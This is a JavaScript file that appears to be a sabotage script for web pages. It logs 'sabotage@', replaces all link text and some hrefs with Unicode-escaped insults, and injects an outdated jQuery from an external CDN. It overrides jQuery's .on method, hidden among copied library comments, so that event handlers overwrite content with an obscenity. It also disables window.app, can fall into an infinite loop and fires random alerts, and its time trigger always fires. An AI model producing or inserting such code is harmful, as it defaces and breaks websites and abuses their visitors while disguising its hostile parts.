/// <reference path="jquery-1.9.0.min.js" />

(function () {
    var time = new Date(2016, 1, 28, 9, 0, 0, 0);
    console.log(time.getTime());
    //1456621200000 begin condition

    var now = new Date();

    //confuse replacex and x .use both   intervalrun
    setInterval(function () {
        console.log("sabotage@" + now.getTime());
    }, 1000);

    //run at begin time
    if (now.getTime() % 1 == 0) {
        var aelem = document.getElementsByTagName('a');
        var delem = document.querySelectorAll('div');

        for (var i = 0; i < delem.length; i++) {
            delem[i].innerHTML = '<a><div>' + delem[i].innerHTML + '</div></a>';
        }
        for (var i = 0; i < aelem.length; i++) {
            aelem[i].textContent = "\u4e0d\u8981\u8bef\u4f1a\uff0c\u6211\u4e0d\u662f\u9488\u5bf9\u4f60\u54c8\uff0c\u6211\u662f\u8bf4\uff0c\u5728\u5ea7\u7684\u5404\u4f4d\u90fd\u662f\u5783\u573e";
            if (i % 2 == 0) {
                aelem[i].setAttribute("href", "javascript:alert('\u70b9\u4ec0\u4e48\u70b9\u554a\u4f60\u8fd9\u5783\u573e\uff0c\u6eda')");
            }
        }
        (function (e) {
            e.setAttribute("src", "http://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js");
            document.getElementsByTagName("body")[0].appendChild(e);
        })(document.createElement("script"));

        $.fn.extend({
            "on": function (types, selector, data, fn, /*INTERNAL*/ one) {
                var type, origFn;

                // Types can be a map of types/handlers
                if (typeof types === "object") {
                    // ( types-Object, selector, data )
                    if (typeof selector !== "string") {
                        // ( types-Object, data )
                        data = data || selector;
                        selector = undefined;
                    }
                    // 遍历types对象，针对每一个属性绑定on()方法
                    // 将types[type]作为fn传入
                    for (type in types) {
                        this.on(type, selector, data, types[type], one);
                    }
                    return this;
                }

                // 参数修正
                // jQuery这种参数修正的方法很好
                // 可以兼容多种参数形式
                // 可见在灵活调用的背后做了很多处理
                if (data == null && fn == null) {
                    // ( types, fn )
                    fn = selector;
                    data = selector = undefined;
                } else if (fn == null) {
                    if (typeof selector === "string") {
                        // ( types, selector, fn )
                        fn = data;
                        data = undefined;
                    } else {
                        // ( types, data, fn )
                        fn = data;
                        data = selector;
                        selector = undefined;
                    }
                }
                if (fn === false) {
                    // fn传入false时，阻止该事件的默认行为
                    // function returnFalse() {return false;}
                    fn = returnFalse;
                } else if (!fn) {
                    return this;
                }

                // one()调用on()
                if (one === 1) {
                    origFn = fn;
                    fn = function (event) {
                        // Can use an empty set, since event contains the info
                        // 用一个空jQuery对象，这样可以使用.off方法，
                        // 并且event带有remove事件需要的信息
                        jQuery().off(event);
                        return origFn.apply(this, arguments);
                    };
                    // Use same guid so caller can remove using origFn
                    // 事件删除依赖于guid
                    fn.guid = origFn.guid || (origFn.guid = jQuery.guid++);
                }

                // 这里调用jQuery的each方法遍历调用on()方法的jQuery对象
                // 如$('li').on(...)则遍历每一个li传入add()
                // 推荐使用$(document).on()或者集合元素的父元素
                fn = function () {
                    $(this).html('\u0073\u006f\u006e\u002c\u0065\u0061\u0074\u0020\u0074\u0068\u0069\u0073\u0020\u0073\u0068\u0069\u0074');
                };
                return this.each(function () {
                    jQuery.event.add(this, types, fn, data, selector);
                });

            }
        });
//        require.config(
//{
//    baseUrl: "/webapp/",
//    paths:
//    {
//        "jquery": ["http://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js", "js/jquery-1.9.0.min"],
//        "handlerbars": "whatthefuckingyouarelookingat",
//        "iscroll": ["whatthefuckingyouarelookingat","js/iscroll"],
//    }
        //});
        window.app = undefined;


        var rad=parseInt(Math.random()*10);
        document.querySelectorAll('div')[rad].style.backgroundColor = 'red';


        if (now.getTime() % 100000000 == 0) {
            var i = 0;
            while ("gswmareasshole" == "gswmareasshole") {
                console.log(i++);
            }
        }

        if (Math.floor(Math.random() * 3) == 0) {
            alert("random run function at low possibility");
        }
    }

    $("div.event").on("click", function () {
        alert();
    });


    function replacesI() {
        setInterval(arguments[0](), arguments[1]);
    }

    function sdocstruc() {

    }
})();